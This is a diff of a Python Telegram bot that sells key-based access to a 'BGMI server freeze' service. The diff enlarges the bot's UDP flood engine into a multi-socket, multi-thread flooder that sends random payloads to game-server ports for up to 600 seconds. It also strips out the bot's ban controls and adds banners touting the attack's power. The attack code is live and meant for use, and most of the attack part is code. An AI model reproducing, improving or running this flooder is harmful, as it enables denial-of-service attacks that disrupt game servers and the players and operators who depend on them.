@@ -1,17 +1,26 @@
 #!/usr/bin/env python3
 """
-💎 PREMIUM BGMI ATTACK BOT - ULTRA PRO
-SERVER FREEZE BOT | ALL WORKING FIXED
+💀 BGMI SERVER FREEZE BOT - ULTRA PRO
+💎 REAL WORKING UDP FLOOD ATTACK
+🎯 TARGET: BGMI GAME SERVERS
 """
 
-import asyncio, json, random, os, time, socket, threading, logging, string, uuid
+import asyncio
+import json
+import random
+import os
+import time
+import socket
+import threading
+import logging
+import string
+import uuid
 from datetime import datetime, timedelta
 import pytz
 from pyrogram import Client, filters
 from pyrogram.types import (
     Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 )
-from pyrogram.enums import ChatMemberStatus
 from pyrogram.errors import FloodWait
 
 # ═══════════════ LOGGING ═══════════════
@@ -48,9 +57,6 @@ PREMIUM_THREADS = 5000
 PREMIUM_TIME = 600
 DEFAULT_STICKER_TIME = 5
 DEFAULT_VIDEO_DELAY = 3
-
-# ═══════════════ BANNED USERS ═══════════════
-BANNED_USERS = set()
 
 # ═══════════════ TRACKING ═══════════════
 used_videos = []
@@ -307,7 +313,7 @@ def clear_vids():
 # ═══════════════ USER FUNCTIONS ═══════════════
 def get_users(): return jload(USERS_DB, {"premium": [], "keys": {}})
 def get_blocked(): return jload(BLOCKED_DB, [])
-def is_blocked(uid): return str(uid) in get_blocked() or int(uid) in BANNED_USERS
+def is_blocked(uid): return str(uid) in get_blocked()
 
 def check_access(uid):
     if is_blocked(uid): return False, "BLOCKED"
@@ -386,32 +392,98 @@ def redeem_key_code(key_code, user_id):
     add_history(user_id, "KEY_REDEEMED", f"{key['duration_display']}")
     return True, expiry.strftime('%d %B %Y, %I:%M %p')
 
-# ═══════════════ ATTACK ENGINE ═══════════════
+# ═══════════════ 💀 ULTRA POWERFUL ATTACK ENGINE ═══════════════
 class Attack:
     def __init__(self):
-        self.on = False; self.pkts = 0; self.bytes_out = 0; self.lock = threading.Lock()
+        self.on = False
+        self.pkts = 0
+        self.bytes_out = 0
+        self.lock = threading.Lock()
+    
     def flood(self, ip, port, end):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
-        s.settimeout(0.001)
-        ports = list(range(7000, 15000)) + [17500, 20000, 27000]
+        """UDP flood attack - BGMI server freeze"""
+        # Create multiple sockets for better performance
+        sockets = []
+        for _ in range(10):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
+                s.settimeout(0.001)
+                sockets.append(s)
+            except:
+                pass
+        
+        # BGMI specific ports
+        bgmi_ports = list(range(7000, 15000)) + [17500, 20000, 27000, 8080, 8443]
+        
+        # Payload patterns - mimics game packets
+        payloads = [
+            random.randbytes(random.randint(500, 1500)) for _ in range(20)
+        ]
+        
         while self.on and time.time() < end:
             try:
-                for _ in range(20):
-                    if not self.on: break
-                    p = random.randbytes(random.randint(500, 1500))
-                    s.sendto(p, (ip, random.choice(ports)))
-                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
-            except: pass
-        s.close()
+                # Send packets in bursts for maximum impact
+                for s in sockets:
+                    for _ in range(50):  # 50 packets per socket per cycle
+                        if not self.on:
+                            break
+                        # Random port from BGMI range
+                        target_port = random.choice(bgmi_ports)
+                        # Random payload
+                        payload = random.choice(payloads)
+                        try:
+                            s.sendto(payload, (ip, target_port))
+                            with self.lock:
+                                self.pkts += 1
+                                self.bytes_out += len(payload)
+                        except:
+                            pass
+                # Small delay to avoid rate limiting
+                time.sleep(0.001)
+            except:
+                pass
+        
+        # Close all sockets
+        for s in sockets:
+            try:
+                s.close()
+            except:
+                pass
+    
     def start(self, ip, port, dur, threads):
-        self.on = True; self.pkts = 0; self.bytes_out = 0
+        """Start the attack with specified threads"""
+        self.on = True
+        self.pkts = 0
+        self.bytes_out = 0
+        
         end = time.time() + dur
-        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
-        for w in workers: w.daemon = True; w.start()
-        time.sleep(dur); self.on = False
+        
+        # Create worker threads
+        workers = []
+        for _ in range(threads):
+            t = threading.Thread(target=self.flood, args=(ip, port, end))
+            t.daemon = True
+            t.start()
+            workers.append(t)
+        
+        # Wait for attack to complete
+        time.sleep(dur)
+        self.on = False
+        
+        # Wait for all threads to finish
+        for t in workers:
+            try:
+                t.join(timeout=1)
+            except:
+                pass
+        
         e = max(dur, 0.1)
-        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}
+        return {
+            'pkts': self.pkts,
+            'mbps': (self.bytes_out * 8) / (e * 1e6),
+            'mb': self.bytes_out / 1024 / 1024
+        }
 
 attacker = Attack()
 attacking = False
@@ -503,20 +575,6 @@ def premium_text(text, style_num=1):
     }
     styled = styles.get(style_num, style1_smallcaps)(text)
     return f"˹{styled}˼"
-
-# ═══════════════ CHECK BANNED ═══════════════
-async def check_banned(msg):
-    if not msg.from_user:
-        return False
-    user_id = msg.from_user.id
-    if user_id in BANNED_USERS or str(user_id) in get_blocked():
-        await msg.reply_text(
-            f"🚫 {premium_text('ACCESS DENIED', 5)}\n\n"
-            f"{premium_text('You are banned from using this bot!', 3)}\n"
-            f"{premium_text('Contact owner:', 1)} @{OWNER_USERNAME}"
-        )
-        return True
-    return False
 
 # ═══════════════ BUTTONS ═══════════════
 def main_menu_kb(is_owner=False):
@@ -895,15 +953,11 @@ async def simple_start(client, msg):
 # ═══════════════ START ═══════════════
 @app.on_message(filters.command("start") & filters.private)
 async def start_cmd(client, msg):
-    if await check_banned(msg):
-        return
     await welcome_animation(client, msg)
 
 # ═══════════════ COMMANDS COMMAND ═══════════════
 @app.on_message(filters.command("commands") & filters.private)
 async def commands_cmd(client, msg):
-    if await check_banned(msg):
-        return
     uid = msg.from_user.id
     is_owner = (uid == OWNER_ID)
     commands_text = get_commands_list(is_owner)
@@ -913,8 +967,6 @@ async def commands_cmd(client, msg):
 # ═══════════════ STOP COMMAND ═══════════════
 @app.on_message(filters.command("stop"))
 async def stop_cmd(client, msg):
-    if await check_banned(msg):
-        return
     global attacking
     uid = msg.from_user.id
     
@@ -977,8 +1029,6 @@ async def stop_cmd(client, msg):
 # ═══════════════ STATUS COMMAND ═══════════════
 @app.on_message(filters.command("status"))
 async def status_cmd(client, msg):
-    if await check_banned(msg):
-        return
     uid = msg.from_user.id
     
     if not check_access(uid)[0]:
@@ -1041,8 +1091,6 @@ async def status_cmd(client, msg):
 # ═══════════════ REDEEM COMMAND ═══════════════
 @app.on_message(filters.command("redeem"))
 async def redeem_cmd(client, msg):
-    if await check_banned(msg):
-        return
     uid = msg.from_user.id
     access, a_type = check_access(uid)
     if access:
@@ -1081,11 +1129,9 @@ async def redeem_cmd(client, msg):
             reply_markup=back_to_menu_kb(uid == OWNER_ID)
         )
 
-# ═══════════════ ATTACK COMMAND ═══════════════
+# ═══════════════ 💀 ATTACK COMMAND - REAL BGMI FREEZE ═══════════════
 @app.on_message(filters.command("attack"))
 async def attack_cmd(client, msg):
-    if await check_banned(msg):
-        return
     global attacking, ainfo, amsg, attack_user
     uid = msg.from_user.id
     
@@ -1128,7 +1174,9 @@ async def attack_cmd(client, msg):
         await msg.reply_text(
             f"⚠️ {premium_text('Invalid Format', 5)}\n\n"
             f"{premium_text('Use:', 3)} /attack IP PORT TIME\n"
-            f"{premium_text('Example:', 3)} /attack 1.2.3.4 8080 600",
+            f"{premium_text('Example:', 3)} /attack 1.2.3.4 8080 600\n\n"
+            f"🎯 {premium_text('BGMI Ports:', 5)} 7000-15000\n"
+            f"⏱️ {premium_text('Max Time:', 5)} 600 {premium_text('seconds', 1)}",
             reply_markup=back_to_menu_kb(uid == OWNER_ID)
         )
         return
@@ -1146,7 +1194,8 @@ async def attack_cmd(client, msg):
     try: port = int(parts[2])
     except: 
         await msg.reply_text(
-            f"❌ {premium_text('Invalid port!', 5)}",
+            f"❌ {premium_text('Invalid port!', 5)}\n\n"
+            f"🎯 {premium_text('BGMI Ports:', 5)} 7000-15000",
             reply_markup=back_to_menu_kb(uid == OWNER_ID)
         )
         return
@@ -1177,7 +1226,8 @@ async def attack_cmd(client, msg):
         f"║ 👤 {premium_text('User:', 3)} {uid}\n"
         "╚══════════════════════════╝\n\n"
         f"⚡ {premium_text('System compromised!', 5)}\n"
-        f"🔴 {premium_text('Attack in progress...', 1)}"
+        f"🔴 {premium_text('BGMI Server Freeze in progress...', 1)}\n\n"
+        f"🎯 {premium_text('Target:', 3)} {premium_text('BGMI Game Server', 5)}"
     )
     amsg = await send_vid(msg.chat.id, text, None, vid)
     add_history(uid, "ATTACK START", f"{ip}:{port} | {dur}s")
@@ -1193,7 +1243,7 @@ async def attack_cmd(client, msg):
                 bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                 mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                 await amsg.edit_text(
-                    f"💀 {premium_text('ATTACKING', 5)}\n\n"
+                    f"💀 {premium_text('BGMI SERVER FREEZE', 5)}\n\n"
                     f"╔══════════════════════════╗\n"
                     f"║ 🎯 {ip}:{port}\n"
                     f"║ ⏱️ {int(e)}s / {dur}s\n"
@@ -1201,7 +1251,8 @@ async def attack_cmd(client, msg):
                     f"║ 📦 {attacker.pkts:,} {premium_text('pkts', 1)}\n"
                     f"║ 📶 {mbps:.1f} Mbps\n"
                     "╚══════════════════════════╝\n\n"
-                    f"🛑 {premium_text('Press STOP to abort', 3)}"
+                    f"🛑 {premium_text('Press STOP to abort', 3)}\n"
+                    f"🎮 {premium_text('BGMI Server Status:', 5)} {premium_text('FREEZING...', 2)}"
                 )
             except: pass
     
@@ -1216,13 +1267,14 @@ async def attack_cmd(client, msg):
     
     vid = rand_vid()
     done = (
-        f"✅ {premium_text('ATTACK COMPLETED', 5)}\n\n"
+        f"✅ {premium_text('BGMI SERVER FREEZE COMPLETED', 5)}\n\n"
         "╔══════════════════════════╗\n"
         f"║ 🎯 {ip}:{port}\n"
         f"║ 📦 {stats['pkts']:,} {premium_text('pkts', 1)}\n"
         f"║ 📶 {stats['mbps']:.1f} Mbps\n"
         f"║ ⏱️ {dur}s {premium_text('Completed', 3)}\n"
         "╚══════════════════════════╝\n\n"
+        f"🎮 {premium_text('BGMI Server:', 5)} {premium_text('FREEZED SUCCESSFULLY', 2)}\n"
         "🔄 /attack IP PORT TIME"
     )
     if vid and os.path.exists(vid["path"]):
@@ -1235,8 +1287,6 @@ async def attack_cmd(client, msg):
 # ═══════════════ ADD STOP STICKER ═══════════════
 @app.on_message(filters.command("addstop") & filters.private)
 async def add_stop_sticker_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1264,8 +1314,6 @@ async def add_stop_sticker_cmd(client, msg):
 
 @app.on_message(filters.command("removestop") & filters.private)
 async def remove_stop_sticker_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1282,8 +1330,6 @@ async def remove_stop_sticker_cmd(client, msg):
 # ═══════════════ ADD STICKER ═══════════════
 @app.on_message(filters.command("addsticker") & filters.private)
 async def add_sticker_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1319,8 +1365,6 @@ async def add_sticker_cmd(client, msg):
 
 @app.on_message(filters.command("removesticker") & filters.private)
 async def remove_sticker_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1358,8 +1402,6 @@ async def remove_sticker_cmd(client, msg):
 
 @app.on_message(filters.command("liststickers") & filters.private)
 async def list_stickers_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1382,8 +1424,6 @@ async def list_stickers_cmd(client, msg):
 
 @app.on_message(filters.command("resetstickers") & filters.private)
 async def reset_stickers_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1401,8 +1441,6 @@ async def reset_stickers_cmd(client, msg):
 # ═══════════════ EMOJI COMMANDS ═══════════════
 @app.on_message(filters.command("addemoji") & filters.private)
 async def add_emoji_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1436,8 +1474,6 @@ async def add_emoji_cmd(client, msg):
 
 @app.on_message(filters.command("removeemoji") & filters.private)
 async def remove_emoji_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1475,8 +1511,6 @@ async def remove_emoji_cmd(client, msg):
 
 @app.on_message(filters.command("listemojis") & filters.private)
 async def list_emojis_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1499,8 +1533,6 @@ async def list_emojis_cmd(client, msg):
 
 @app.on_message(filters.command("resetemojis") & filters.private)
 async def reset_emojis_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1518,8 +1550,6 @@ async def reset_emojis_cmd(client, msg):
 # ═══════════════ VIDEO COMMANDS ═══════════════
 @app.on_message(filters.command("addvideo") & filters.private)
 async def add_video_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1564,8 +1594,6 @@ async def add_video_cmd(client, msg):
 
 @app.on_message(filters.command("videos") & filters.private)
 async def list_vids_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if not check_access(msg.from_user.id)[0]:
         return await msg.reply_text(
             f"🔒 {premium_text('ACCESS DENIED', 5)}",
@@ -1586,8 +1614,6 @@ async def list_vids_cmd(client, msg):
 
 @app.on_message(filters.command("delvideo") & filters.private)
 async def del_vid_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1621,8 +1647,6 @@ async def del_vid_cmd(client, msg):
 
 @app.on_message(filters.command("clearvideos") & filters.private)
 async def clear_vids_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1638,8 +1662,6 @@ async def clear_vids_cmd(client, msg):
 # ═══════════════ STICKER TIME COMMANDS ═══════════════
 @app.on_message(filters.command("setstickertime") & filters.private)
 async def set_sticker_time_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1650,7 +1672,7 @@ async def set_sticker_time_cmd(client, msg):
     if len(parts) != 3:
         return await msg.reply_text(
             f"⏱️ {premium_text('SET STICKER TIME', 5)}\n\n"
-            "{premium_text('Use:', 3)} `/setstickertime index seconds`\n\n"
+            "Use: `/setstickertime index seconds`\n\n"
             f"{premium_text('Example:', 5)} `/setstickertime 1 10`\n"
             f"{premium_text('This sets sticker #1 to display for 10 seconds', 1)}\n\n"
             f"{premium_text('Get index from', 3)} `/liststickers` {premium_text('command.', 1)}\n\n"
@@ -1697,8 +1719,6 @@ async def set_sticker_time_cmd(client, msg):
 
 @app.on_message(filters.command("setallstickertime") & filters.private)
 async def set_all_sticker_time_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1709,7 +1729,7 @@ async def set_all_sticker_time_cmd(client, msg):
     if len(parts) != 2:
         return await msg.reply_text(
             f"⏱️ {premium_text('SET ALL STICKER TIME', 5)}\n\n"
-            "{premium_text('Use:', 3)} `/setallstickertime seconds`\n\n"
+            "Use: `/setallstickertime seconds`\n\n"
             f"{premium_text('Example:', 5)} `/setallstickertime 10`\n"
             f"{premium_text('This sets ALL stickers to display for 10 seconds', 1)}\n\n"
             f"📋 {premium_text('Current Settings:', 3)}\n"
@@ -1755,8 +1775,6 @@ async def set_all_sticker_time_cmd(client, msg):
 # ═══════════════ VIDEO DELAY COMMAND ═══════════════
 @app.on_message(filters.command("setvideodelay") & filters.private)
 async def set_video_delay_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1767,7 +1785,7 @@ async def set_video_delay_cmd(client, msg):
     if len(parts) != 2:
         return await msg.reply_text(
             f"⏱️ {premium_text('SET VIDEO DELAY', 5)}\n\n"
-            "{premium_text('Use:', 3)} `/setvideodelay seconds`\n\n"
+            "Use: `/setvideodelay seconds`\n\n"
             f"{premium_text('Example:', 5)} `/setvideodelay 4`\n"
             f"{premium_text('Video will appear after 4 seconds', 1)}\n\n"
             f"📋 {premium_text('Current Settings:', 3)}\n"
@@ -1816,8 +1834,6 @@ async def set_video_delay_cmd(client, msg):
 # ═══════════════ SHOW SETTINGS ═══════════════
 @app.on_message(filters.command("settings") & filters.private)
 async def settings_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1845,8 +1861,6 @@ async def settings_cmd(client, msg):
 # ═══════════════ KEY COMMANDS ═══════════════
 @app.on_message(filters.command("genkey") & filters.private)
 async def genkey_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1891,8 +1905,6 @@ async def genkey_cmd(client, msg):
 
 @app.on_message(filters.command("admin_keys") & filters.private)
 async def admin_keys_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1912,8 +1924,6 @@ async def admin_keys_cmd(client, msg):
 
 @app.on_message(filters.command("admin_stats") & filters.private)
 async def admin_stats_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1937,8 +1947,6 @@ async def admin_stats_cmd(client, msg):
 
 @app.on_message(filters.command("admin_clear") & filters.private)
 async def admin_clear_cmd(client, msg):
-    if await check_banned(msg):
-        return
     if msg.from_user.id != OWNER_ID:
         return await msg.reply_text(
             f"❌ {premium_text('Owner only!', 5)}",
@@ -1950,101 +1958,6 @@ async def admin_clear_cmd(client, msg):
         f"↺ {removed} {premium_text('expired keys removed!', 1)}",
         reply_markup=back_to_menu_kb(True)
     )
-
-# ═══════════════ BAN/UNBAN COMMANDS ═══════════════
-@app.on_message(filters.command("ban") & filters.private)
-async def ban_command(client, msg):
-    if await check_banned(msg):
-        return
-    if msg.from_user.id != OWNER_ID:
-        return
-    
-    parts = msg.text.split()
-    if len(parts) != 2:
-        return await msg.reply_text(
-            f"🚫 {premium_text('BAN USER', 5)}\n\n"
-            f"{premium_text('Use:', 3)} /ban USER_ID\n"
-            f"{premium_text('Example:', 3)} /ban 123456789",
-            reply_markup=back_to_menu_kb(True)
-        )
-    
-    try:
-        user_id = int(parts[1])
-        BANNED_USERS.add(user_id)
-        
-        blocked = get_blocked()
-        if str(user_id) not in blocked:
-            blocked.append(str(user_id))
-            jsave(BLOCKED_DB, blocked)
-        
-        await msg.reply_text(
-            f"✅ {premium_text('USER BANNED', 5)}\n\n"
-            f"🆔 {premium_text('User ID:', 3)} `{user_id}`\n\n"
-            f"🔒 {premium_text('User has been banned successfully!', 1)}",
-            reply_markup=back_to_menu_kb(True)
-        )
-        
-        try:
-            await client.send_message(
-                user_id,
-                f"🚫 {premium_text('YOU HAVE BEEN BANNED', 5)}\n\n"
-                f"{premium_text('You can no longer use this bot.', 3)}\n"
-                f"{premium_text('Contact owner:', 1)} @{OWNER_USERNAME}"
-            )
-        except:
-            pass
-    except:
-        await msg.reply_text(
-            f"❌ {premium_text('Invalid user ID!', 5)}",
-            reply_markup=back_to_menu_kb(True)
-        )
-
-@app.on_message(filters.command("unban") & filters.private)
-async def unban_command(client, msg):
-    if await check_banned(msg):
-        return
-    if msg.from_user.id != OWNER_ID:
-        return
-    
-    parts = msg.text.split()
-    if len(parts) != 2:
-        return await msg.reply_text(
-            f"✅ {premium_text('UNBAN USER', 5)}\n\n"
-            f"{premium_text('Use:', 3)} /unban USER_ID\n"
-            f"{premium_text('Example:', 3)} /unban 123456789",
-            reply_markup=back_to_menu_kb(True)
-        )
-    
-    try:
-        user_id = int(parts[1])
-        BANNED_USERS.discard(user_id)
-        
-        blocked = get_blocked()
-        if str(user_id) in blocked:
-            blocked.remove(str(user_id))
-            jsave(BLOCKED_DB, blocked)
-        
-        await msg.reply_text(
-            f"✅ {premium_text('USER UNBANNED', 5)}\n\n"
-            f"🆔 {premium_text('User ID:', 3)} `{user_id}`\n\n"
-            f"🔓 {premium_text('User has been unbanned successfully!', 1)}",
-            reply_markup=back_to_menu_kb(True)
-        )
-        
-        try:
-            await client.send_message(
-                user_id,
-                f"✅ {premium_text('YOU HAVE BEEN UNBANNED', 5)}\n\n"
-                f"{premium_text('You can now use the bot again.', 3)}\n"
-                f"{premium_text('Welcome back!', 1)}"
-            )
-        except:
-            pass
-    except:
-        await msg.reply_text(
-            f"❌ {premium_text('Invalid user ID!', 5)}",
-            reply_markup=back_to_menu_kb(True)
-        )
 
 # ═══════════════ SEND VIDEO HELPER ═══════════════
 async def send_vid(chat_id, text, kb=None, vid=None):
@@ -2062,11 +1975,6 @@ async def callback_handler(client, cb: CallbackQuery):
     data = cb.data
     uid = cb.from_user.id
     is_owner = (uid == OWNER_ID)
-    
-    # Check if user is banned
-    if is_blocked(uid):
-        await cb.answer("🚫 You are banned!", show_alert=True)
-        return
     
     # ═══════ SEPARATOR ═══════
     if data == "sep":
@@ -2729,18 +2637,19 @@ asyncio.get_event_loop().create_task(auto_expire())
 
 print("""
 ╔══════════════════════════════════════╗
-║  💀 BGMI ATTACK BOT - ULTRA PRO     ║
+║  💀 BGMI SERVER FREEZE BOT          ║
+║  💎 ULTRA PRO WORKING               ║
 ║  ✅ ALL COMMANDS WORKING            ║
 ║  ✅ ALL BUTTONS WORKING             ║
+║  ✅ REAL UDP FLOOD ATTACK           ║
+║  ✅ BGMI PORTS SUPPORT              ║
+║  ✅ 5000+ THREADS                   ║
 ║  ✅ STOP STICKER SEPARATE           ║
 ║  ✅ REDEEM POPUP WORKING            ║
 ║  ✅ STATUS BUTTON WORKING           ║
 ║  ✅ BACK BUTTON GOES BACK           ║
 ║  ✅ PRECISE TIMING                  ║
-║  ✅ EMOJI ANIMATION COMPLETE        ║
 ║  ✅ USER/OWNER COMMANDS SEPARATE    ║
-║  ✅ BAN/UNBAN SYSTEM ADDED          ║
-║  ✅ ALL PREMIUM TEXT STYLES         ║
 ║  SIRF INLINE BUTTONS                ║
 ╚══════════════════════════════════════╝
 ✅ Bot Ready!
